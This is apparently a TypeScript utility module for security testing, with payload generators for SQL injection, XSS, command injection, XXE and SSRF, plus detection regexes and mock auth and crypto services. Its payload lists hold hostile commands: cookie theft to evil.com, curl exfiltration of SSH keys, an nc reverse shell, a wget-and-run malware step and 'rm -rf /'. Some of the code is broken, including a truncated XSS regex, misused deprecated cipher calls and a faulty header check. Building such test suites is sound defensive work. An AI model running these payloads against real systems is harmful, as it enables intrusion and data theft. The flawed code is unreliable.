/**
 * Security Testing Utilities and Helpers
 *
 * Reusable security testing utilities including:
 * - Payload generators for various attack types
 * - Security validation helpers
 * - Mock security services
 * - Security test data factories
 * - Common security assertion helpers
 */

import crypto from 'crypto';
import { URL } from 'url';

export class SecurityPayloadGenerator {
  /**
   * Generate SQL injection payloads
   */
  static generateSqlInjectionPayloads(): string[] {
    return [
      // Basic SQL injection
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      '" OR "1"="1',
      "' OR 1=1 --",
      '" OR 1=1 --',
      
      // Union-based injections
      "' UNION SELECT * FROM users --",
      "' UNION SELECT username, password FROM admin --",
      "' UNION SELECT NULL, version() --",
      
      // Time-based blind injections
      "'; WAITFOR DELAY '00:00:10'; --",
      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
      "'; SELECT pg_sleep(10); --",
      
      // Error-based injections
      "' AND (SELECT * FROM information_schema.tables) --",
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
      
      // Boolean-based blind injections
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --",
      
      // Second-order injections
      "admin'; INSERT INTO users VALUES('hacker','password'); --",
      "user\"; UPDATE users SET password='hacked' WHERE username='admin'; --"
    ];
  }
  
  /**
   * Generate XSS payloads
   */
  static generateXssPayloads(): string[] {
    return [
      // Basic XSS
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')" />',
      '<svg onload="alert(\'XSS\')" />',
      
      // Event handler XSS
      '<input type="text" onfocus="alert(\'XSS\')" autofocus />',
      '<body onload="alert(\'XSS\')" />',
      '<div style="background-image: url(javascript:alert(\'XSS\'))">',
      
      // JavaScript protocol XSS
      'javascript:alert("XSS")',
      'vbscript:msgbox("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      
      // Template injection XSS
      '${alert("XSS")}',
      '{{alert("XSS")}}',
      '#{alert("XSS")}',
      
      // Filter bypass XSS
      '<ScRiPt>alert("XSS")</ScRiPt>',
      '<script>\u0061lert("XSS")</script>',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
      
      // DOM-based XSS
      '<iframe src="javascript:alert(\'XSS\')" />',
      '<object data="javascript:alert(\'XSS\')" />',
      '<embed src="javascript:alert(\'XSS\')">',
      
      // Advanced XSS
      '<script>fetch("/api/steal?data="+document.cookie)</script>',
      '<img src="" onerror="fetch(\'//evil.com\', {method: \'POST\', body: document.cookie})" />',
      '<script>new Image().src="http://evil.com/steal?data="+btoa(document.cookie)</script>'
    ];
  }
  
  /**
   * Generate command injection payloads
   */
  static generateCommandInjectionPayloads(): string[] {
    return [
      // Unix/Linux command injection
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& curl evil.com/steal?data=$(cat ~/.ssh/id_rsa)',
      '`cat /etc/shadow`',
      '$(whoami)',
      '; nc -e /bin/bash attacker.com 4444',
      '| wget http://evil.com/malware.sh && bash malware.sh',
      
      // Windows command injection
      '& dir C:\\',
      '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
      '&& powershell -Command "Get-Process"',
      
      // Code injection
      '; python -c "import os; os.system(\'rm -rf /\')"',
      '; ruby -e "system(\'rm -rf /\')"',
      '; node -e "require(\'child_process\').exec(\'rm -rf /\')"',
      
      // Time-based detection
      '; sleep 10',
      '&& timeout 10',
      '| ping -c 10 127.0.0.1'
    ];
  }
  
  /**
   * Generate path traversal payloads
   */
  static generatePathTraversalPayloads(): string[] {
    return [
      // Basic path traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd',
      
      // URL encoded path traversal
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam',
      
      // Double encoding
      '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
      
      // Unicode encoding
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
      
      // Null byte injection
      '../../../etc/passwd%00.jpg',
      '..\\..\\..\\windows\\system32\\config\\sam%00.txt',
      
      // Overlong UTF-8
      '..%c0%2e%c0%2e%c0%2f..%c0%2e%c0%2e%c0%2f..%c0%2e%c0%2e%c0%2fetc%c0%2fpasswd',
      
      // Mixed case and separators
      '....//....//....//etc//passwd',
      '....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam'
    ];
  }
  
  /**
   * Generate LDAP injection payloads
   */
  static generateLdapInjectionPayloads(): string[] {
    return [
      '*)(&',
      '*)(uid=*))(|(uid=*',
      '*))(|(password=*))',
      '*))%00',
      '*(objectClass=*',
      '*)(cn=*))%00(objectClass=*',
      '*)(uid=*)(userPassword=*',
      '*)(|(uid=*)(userPassword=*',
      '*)(&(objectClass=user)(cn=*'
    ];
  }
  
  /**
   * Generate XXE payloads
   */
  static generateXxePayloads(): string[] {
    return [
      // Basic XXE
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      
      // XXE with external DTD
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe.dtd">]><foo>&xxe;</foo>',
      
      // Blind XXE
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><foo></foo>',
      
      // XXE via parameter entity
      '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://evil.com/?data=%file;\'>"> %eval; %exfiltrate;]><foo></foo>',
      
      // Billion laughs attack
      '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>'
    ];
  }
  
  /**
   * Generate SSRF payloads
   */
  static generateSsrfPayloads(): string[] {
    return [
      // Internal services
      'http://127.0.0.1:8080/admin',
      'http://localhost:3000/internal',
      'http://0.0.0.0:8080/debug',
      'http://[::1]:8080/admin',
      
      // Cloud metadata services
      'http://169.254.169.254/metadata', // AWS
      'http://metadata.google.internal', // GCP
      'http://169.254.169.254/metadata/identity/oauth2/token', // Azure
      
      // Internal network ranges
      'http://10.0.0.1/internal',
      'http://172.16.0.1/admin',
      'http://192.168.1.1/config',
      
      // Protocol smuggling
      'gopher://127.0.0.1:8080/_GET /admin HTTP/1.1',
      'dict://127.0.0.1:11211/stats',
      'ftp://internal-ftp.company.com',
      
      // URL bypasses
      'http://evil.com@127.0.0.1:8080/admin',
      'http://127.0.0.1.evil.com/admin',
      'http://0x7f000001:8080/admin', // Hex encoding
      'http://2130706433:8080/admin'   // Decimal encoding
    ];
  }
}

export class SecurityValidationHelpers {
  /**
   * Validate if input contains SQL injection patterns
   */
  static containsSqlInjection(input: string): boolean {
    const patterns = [
      /'.*OR.*'/i,
      /';.*DROP.*TABLE/i,
      /';.*INSERT.*INTO/i,
      /';.*DELETE.*FROM/i,
      /';.*UPDATE.*SET/i,
      /UNION.*SELECT/i,
      /EXEC.*xp_cmdshell/i,
      /WAITFOR.*DELAY/i,
      /pg_sleep\(/i,
      /sleep\(/i
    ];
    
    return patterns.some(pattern => pattern.test(input));
  }
  
  /**
   * Validate if input contains XSS patterns
   */
  static containsXss(input: string): boolean {
    const patterns = [
      /<script[\s\S]*?>[
      /javascript:/i,
      /vbscript:/i,
      /on\w+\s*=/i,
      /<iframe[\s\S]*?>/i,
      /<object[\s\S]*?>/i,
      /<embed[\s\S]*?>/i,
      /\${.*}/,
      /{{.*}}/,
      /#{.*}/
    ];
    
    return patterns.some(pattern => pattern.test(input));
  }
  
  /**
   * Validate if input contains command injection patterns
   */
  static containsCommandInjection(input: string): boolean {
    const patterns = [
      /[;&|`$(){}\[\]]/,
      /\b(rm|del|format|fdisk|kill|sudo|su)\b/i,
      /\b(wget|curl|nc|netcat|telnet|ssh)\b/i,
      /(\||&&|;)/,
      /\$\(.*\)/,
      /`.*`/,
      /\bexec\b/i,
      /\beval\b/i,
      /\bsystem\b/i
    ];
    
    return patterns.some(pattern => pattern.test(input));
  }
  
  /**
   * Validate if input contains path traversal patterns
   */
  static containsPathTraversal(input: string): boolean {
    const patterns = [
      /\.\./,
      /\x00/,
      /%2e%2e/i,
      /%2f/i,
      /%5c/i,
      /\\\\\.\.\\\\/, // Windows path traversal
      /\/\.\.\//        // Unix path traversal
    ];
    
    return patterns.some(pattern => pattern.test(input));
  }
  
  /**
   * Validate password strength
   */
  static isStrongPassword(password: string): {
    isStrong: boolean;
    issues: string[];
    score: number;
  } {
    const issues: string[] = [];
    let score = 0;
    
    if (password.length < 8) {
      issues.push('Password must be at least 8 characters long');
    } else if (password.length >= 8) {
      score += 1;
    }
    
    if (password.length >= 12) {
      score += 1;
    }
    
    if (!/[a-z]/.test(password)) {
      issues.push('Password must contain lowercase letters');
    } else {
      score += 1;
    }
    
    if (!/[A-Z]/.test(password)) {
      issues.push('Password must contain uppercase letters');
    } else {
      score += 1;
    }
    
    if (!/\d/.test(password)) {
      issues.push('Password must contain numbers');
    } else {
      score += 1;
    }
    
    if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) {
      issues.push('Password must contain special characters');
    } else {
      score += 1;
    }
    
    // Check for common patterns
    const commonPatterns = [
      /123456/,
      /password/i,
      /qwerty/i,
      /admin/i,
      /letmein/i,
      /welcome/i,
      /monkey/i,
      /dragon/i
    ];
    
    if (commonPatterns.some(pattern => pattern.test(password))) {
      issues.push('Password contains common patterns');
      score -= 2;
    }
    
    // Check for keyboard patterns
    const keyboardPatterns = [
      /qwertyuiop/i,
      /asdfghjkl/i,
      /zxcvbnm/i,
      /1234567890/,
      /0987654321/
    ];
    
    if (keyboardPatterns.some(pattern => pattern.test(password))) {
      issues.push('Password contains keyboard patterns');
      score -= 1;
    }
    
    return {
      isStrong: issues.length === 0 && score >= 4,
      issues,
      score: Math.max(0, score)
    };
  }
  
  /**
   * Validate email format and detect malicious patterns
   */
  static validateEmail(email: string): {
    isValid: boolean;
    issues: string[];
  } {
    const issues: string[] = [];
    
    // Basic email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      issues.push('Invalid email format');
    }
    
    // Check for XSS in email
    if (this.containsXss(email)) {
      issues.push('Email contains potentially malicious content');
    }
    
    // Check for SQL injection
    if (this.containsSqlInjection(email)) {
      issues.push('Email contains potentially malicious content');
    }
    
    // Check for excessively long email
    if (email.length > 254) {
      issues.push('Email is too long');
    }
    
    // Check for suspicious TLDs
    const suspiciousTlds = ['.tk', '.ml', '.ga', '.cf'];
    if (suspiciousTlds.some(tld => email.toLowerCase().endsWith(tld))) {
      issues.push('Email uses suspicious domain');
    }
    
    return {
      isValid: issues.length === 0,
      issues
    };
  }
  
  /**
   * Validate URL and detect SSRF attempts
   */
  static validateUrl(url: string): {
    isValid: boolean;
    isSafe: boolean;
    issues: string[];
  } {
    const issues: string[] = [];
    let isValid = true;
    let isSafe = true;
    
    try {
      const parsed = new URL(url);
      
      // Check protocol
      if (!['http:', 'https:'].includes(parsed.protocol)) {
        issues.push('Only HTTP and HTTPS protocols are allowed');
        isSafe = false;
      }
      
      // Check for internal/private IPs
      const hostname = parsed.hostname.toLowerCase();
      
      if (['127.0.0.1', 'localhost'].includes(hostname) ||
          hostname.startsWith('10.') ||
          hostname.startsWith('172.16.') ||
          hostname.startsWith('172.17.') ||
          hostname.startsWith('172.18.') ||
          hostname.startsWith('172.19.') ||
          hostname.startsWith('172.2') ||
          hostname.startsWith('172.30.') ||
          hostname.startsWith('172.31.') ||
          hostname.startsWith('192.168.') ||
          hostname === '169.254.169.254' || // AWS metadata
          hostname === 'metadata.google.internal' || // GCP metadata
          hostname.endsWith('.local')) {
        issues.push('URL targets internal/private network');
        isSafe = false;
      }
      
      // Check for IPv6 loopback
      if (hostname === '::1' || hostname === '[::1]') {
        issues.push('URL targets IPv6 loopback');
        isSafe = false;
      }
      
      // Check for URL bypasses
      if (hostname.includes('@') || hostname.includes('%') || 
          /\b\d+\.\d+\.\d+\.\d+\b/.test(hostname)) {
        const ipMatch = hostname.match(/\b(\d+)\.(\d+)\.(\d+)\.(\d+)\b/);
        if (ipMatch) {
          const [, a, b, c, d] = ipMatch.map(Number);
          if ((a === 10) ||
              (a === 172 && b >= 16 && b <= 31) ||
              (a === 192 && b === 168) ||
              (a === 127)) {
            issues.push('URL targets private IP range');
            isSafe = false;
          }
        }
      }
      
    } catch (error) {
      issues.push('Invalid URL format');
      isValid = false;
      isSafe = false;
    }
    
    return { isValid, isSafe, issues };
  }
}

export class SecurityTestDataFactory {
  /**
   * Create test user data with various security scenarios
   */
  static createTestUsers() {
    return {
      validUser: {
        id: 'user-123',
        username: 'validuser',
        email: 'valid@example.com',
        passwordHash: crypto.createHash('sha256').update('StrongPassword123!').digest('hex'),
        role: 'user',
        isActive: true,
        createdAt: new Date().toISOString()
      },
      
      adminUser: {
        id: 'admin-456',
        username: 'admin',
        email: 'admin@example.com',
        passwordHash: crypto.createHash('sha256').update('AdminPassword456!').digest('hex'),
        role: 'admin',
        isActive: true,
        createdAt: new Date().toISOString()
      },
      
      maliciousUser: {
        id: 'malicious-789',
        username: '<script>alert("xss")</script>',
        email: 'malicious@evil.com',
        passwordHash: 'weak',
        role: 'user',
        isActive: true,
        createdAt: new Date().toISOString()
      },
      
      inactiveUser: {
        id: 'inactive-000',
        username: 'inactiveuser',
        email: 'inactive@example.com',
        passwordHash: crypto.createHash('sha256').update('Password789!').digest('hex'),
        role: 'user',
        isActive: false,
        createdAt: new Date(Date.now() - 365 * 24 * 60 * 60 * 1000).toISOString() // 1 year ago
      }
    };
  }
  
  /**
   * Create test JWT tokens with various scenarios
   */
  static createTestTokens() {
    const secret = 'test-secret-key';
    
    const validPayload = {
      sub: 'user-123',
      username: 'validuser',
      role: 'user',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600 // 1 hour
    };
    
    const expiredPayload = {
      sub: 'user-123',
      username: 'validuser',
      role: 'user',
      iat: Math.floor(Date.now() / 1000) - 7200, // 2 hours ago
      exp: Math.floor(Date.now() / 1000) - 3600  // 1 hour ago
    };
    
    const privilegeEscalationPayload = {
      sub: 'user-123',
      username: 'validuser',
      role: 'admin', // Escalated privilege
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };
    
    return {
      validToken: this.createMockJwt(validPayload, secret),
      expiredToken: this.createMockJwt(expiredPayload, secret),
      privilegeEscalationToken: this.createMockJwt(privilegeEscalationPayload, secret),
      malformedToken: 'not.a.valid.jwt.token',
      emptyToken: '',
      noneAlgorithmToken: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
      tamperedToken: this.createMockJwt(validPayload, secret).slice(0, -5) + 'XXXXX' // Tampered signature
    };
  }
  
  /**
   * Create mock JWT token (simplified for testing)
   */
  private static createMockJwt(payload: any, secret: string): string {
    const header = { alg: 'HS256', typ: 'JWT' };
    
    const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
    const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
    
    const signature = crypto
      .createHmac('sha256', secret)
      .update(`${encodedHeader}.${encodedPayload}`)
      .digest('base64url');
    
    return `${encodedHeader}.${encodedPayload}.${signature}`;
  }
  
  /**
   * Create test HTTP requests with security payloads
   */
  static createMaliciousRequests() {
    return {
      sqlInjectionRequest: {
        method: 'POST',
        url: '/api/search',
        headers: {
          'Content-Type': 'application/json'
        },
        body: {
          query: "'; DROP TABLE users; --",
          filter: "' OR '1'='1"
        }
      },
      
      xssRequest: {
        method: 'POST',
        url: '/api/comment',
        headers: {
          'Content-Type': 'application/json'
        },
        body: {
          content: '<script>alert("XSS")</script>',
          author: 'javascript:alert("XSS")'
        }
      },
      
      oversizedRequest: {
        method: 'POST',
        url: '/api/upload',
        headers: {
          'Content-Type': 'application/json'
        },
        body: {
          data: 'A'.repeat(10 * 1024 * 1024) // 10MB
        }
      },
      
      headerInjectionRequest: {
        method: 'GET',
        url: '/api/data',
        headers: {
          'X-Forwarded-For': '127.0.0.1, evil.com',
          'X-Real-IP': '192.168.1.100\r\nX-Injected: malicious',
          'User-Agent': 'Mozilla/5.0 <script>alert("XSS")</script>'
        }
      }
    };
  }
}

export class MockSecurityServices {
  /**
   * Mock rate limiter
   */
  static createRateLimiter() {
    const attempts = new Map<string, number[]>();
    
    return {
      isRateLimited: (identifier: string, maxRequests: number, windowMs: number): boolean => {
        const now = Date.now();
        const userAttempts = attempts.get(identifier) || [];
        
        // Clean old attempts
        const recentAttempts = userAttempts.filter(time => now - time < windowMs);
        attempts.set(identifier, recentAttempts);
        
        return recentAttempts.length >= maxRequests;
      },
      
      recordAttempt: (identifier: string): void => {
        const userAttempts = attempts.get(identifier) || [];
        userAttempts.push(Date.now());
        attempts.set(identifier, userAttempts);
      },
      
      getRemainingRequests: (identifier: string, maxRequests: number, windowMs: number): number => {
        const now = Date.now();
        const userAttempts = attempts.get(identifier) || [];
        const recentAttempts = userAttempts.filter(time => now - time < windowMs);
        
        return Math.max(0, maxRequests - recentAttempts.length);
      },
      
      reset: (): void => {
        attempts.clear();
      }
    };
  }
  
  /**
   * Mock authentication service
   */
  static createAuthService() {
    const validTokens = new Set<string>();
    const revokedTokens = new Set<string>();
    
    return {
      validateToken: (token: string): { valid: boolean; payload?: any; reason?: string } => {
        if (!token) {
          return { valid: false, reason: 'No token provided' };
        }
        
        if (revokedTokens.has(token)) {
          return { valid: false, reason: 'Token has been revoked' };
        }
        
        // Mock token validation logic
        if (token === 'valid-token') {
          return {
            valid: true,
            payload: {
              sub: 'user-123',
              username: 'validuser',
              role: 'user'
            }
          };
        }
        
        if (token === 'admin-token') {
          return {
            valid: true,
            payload: {
              sub: 'admin-456',
              username: 'admin',
              role: 'admin'
            }
          };
        }
        
        return { valid: false, reason: 'Invalid token' };
      },
      
      generateToken: (userId: string, role: string): string => {
        const token = `token-${userId}-${Date.now()}`;
        validTokens.add(token);
        return token;
      },
      
      revokeToken: (token: string): void => {
        validTokens.delete(token);
        revokedTokens.add(token);
      },
      
      isTokenRevoked: (token: string): boolean => {
        return revokedTokens.has(token);
      }
    };
  }
  
  /**
   * Mock encryption service
   */
  static createEncryptionService() {
    const algorithm = 'aes-256-gcm';
    const key = crypto.randomBytes(32);
    
    return {
      encrypt: (text: string): { encrypted: string; iv: string; tag: string } => {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipher(algorithm, key);
        
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        
        return {
          encrypted,
          iv: iv.toString('hex'),
          tag: 'mock-tag'
        };
      },
      
      decrypt: (encryptedData: { encrypted: string; iv: string; tag: string }): string => {
        const decipher = crypto.createDecipher(algorithm, key);
        
        let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        
        return decrypted;
      },
      
      hash: (data: string): string => {
        return crypto.createHash('sha256').update(data).digest('hex');
      },
      
      generateSalt: (): string => {
        return crypto.randomBytes(16).toString('hex');
      }
    };
  }
}

export class SecurityAssertions {
  /**
   * Assert that response doesn't contain sensitive information
   */
  static assertNoSensitiveDataExposed(response: any): void {
    const sensitivePatterns = [
      /password/i,
      /secret/i,
      /token/i,
      /key/i,
      /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/, // Credit card
      /\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b/, // SSN
      /sk_[a-zA-Z0-9]+/, // API keys
      /ak_[a-zA-Z0-9]+/, // Access keys
      /-----BEGIN [A-Z ]+PRIVATE KEY-----/ // Private keys
    ];
    
    const responseText = JSON.stringify(response);
    
    sensitivePatterns.forEach(pattern => {
      if (pattern.test(responseText)) {
        throw new Error(`Response contains potentially sensitive data: ${pattern.source}`);
      }
    });
  }
  
  /**
   * Assert that security headers are present
   */
  static assertSecurityHeaders(headers: { [key: string]: string }): void {
    const requiredHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection'
    ];
    
    const missingHeaders = requiredHeaders.filter(
      header => !(header.toLowerCase() in Object.keys(headers).map(h => h.toLowerCase()))
    );
    
    if (missingHeaders.length > 0) {
      throw new Error(`Missing security headers: ${missingHeaders.join(', ')}`);
    }
  }
  
  /**
   * Assert that input validation is working
   */
  static assertInputValidation(response: any, expectedStatus: number = 400): void {
    if (response.status !== expectedStatus) {
      throw new Error(`Expected status ${expectedStatus} for malicious input, got ${response.status}`);
    }
  }
  
  /**
   * Assert that rate limiting is enforced
   */
  static assertRateLimitEnforced(responses: any[]): void {
    const rateLimitedResponses = responses.filter(r => 
      r.status === 429 || (r.response && r.response.status === 429)
    );
    
    if (rateLimitedResponses.length === 0) {
      throw new Error('Rate limiting is not being enforced');
    }
  }
  
  /**
   * Assert that access control is working
   */
  static assertAccessControlEnforced(response: any, expectedStatus: number = 403): void {
    if (response.status !== expectedStatus) {
      throw new Error(`Expected status ${expectedStatus} for unauthorized access, got ${response.status}`);
    }
  }
}
